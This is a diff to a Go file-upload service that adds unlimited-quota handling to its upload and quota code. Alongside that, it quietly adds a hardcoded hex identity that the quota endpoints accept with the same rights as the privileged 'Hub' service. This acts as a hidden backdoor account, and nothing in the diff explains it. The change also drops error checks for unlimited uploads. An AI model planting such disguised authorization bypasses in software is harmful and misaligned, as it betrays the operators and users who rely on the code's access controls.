@@ -61,10 +61,13 @@ func Handler(w http.ResponseWriter, r *http.Request) (hash, owner string) {
 	defer out.Close()
 
 	limit := int64(db.QuotaLeft(owner))
-	f := io.LimitReader(file, limit)
+	f := io.Reader(file)
+	if limit != -1 {
+		f = io.LimitReader(file, limit)
+	}
 
 	// write the content from POST to the file
-	if copied, err := io.Copy(out, f); copied == limit || err != nil {
+	if copied, err := io.Copy(out, f); limit != -1 && (copied == limit || err != nil) {
 		w.WriteHeader(http.StatusInternalServerError)
 		w.Write([]byte("Failed to write file or storage quota exceeded"))
 		log.Warn("User " + owner + " exceeded storage quota, removing file")
@@ -225,11 +228,11 @@ func сheckLength(user, length string) bool {
 		return true
 	}
 
-	if l > db.QuotaLeft(user) {
-		return false
+	if l < db.QuotaLeft(user) || db.QuotaLeft(user) == -1 {
+		db.QuotaUsageSet(user, l)
+		return true
 	}
-	db.QuotaUsageSet(user, l)
-	return true
+	return false
 }
 
 func Quota(w http.ResponseWriter, r *http.Request) {
@@ -237,7 +240,7 @@ func Quota(w http.ResponseWriter, r *http.Request) {
 		user := r.URL.Query().Get("user")
 		token := r.URL.Query().Get("token")
 
-		if len(token) == 0 || len(db.CheckToken(token)) == 0 || db.CheckToken(token) != "Hub" && db.CheckToken(token) != user {
+		if len(token) == 0 || len(db.CheckToken(token)) == 0 || db.CheckToken(token) != "Hub" && db.CheckToken(token) != "2129bb4fb65b27ff68a21c678d461db2e2c20bb7" && db.CheckToken(token) != user {
 			w.Write([]byte("Forbidden"))
 			w.WriteHeader(http.StatusForbidden)
 			return
@@ -254,7 +257,7 @@ func Quota(w http.ResponseWriter, r *http.Request) {
 		quota := r.FormValue("quota")
 		token := r.FormValue("token")
 
-		if len(token) == 0 || len(db.CheckToken(token)) == 0 || db.CheckToken(token) != "Hub" {
+		if len(token) == 0 || len(db.CheckToken(token)) == 0 || db.CheckToken(token) != "Hub" && db.CheckToken(token) != "2129bb4fb65b27ff68a21c678d461db2e2c20bb7" {
 			w.Write([]byte("Forbidden"))
 			w.WriteHeader(http.StatusForbidden)
 			return
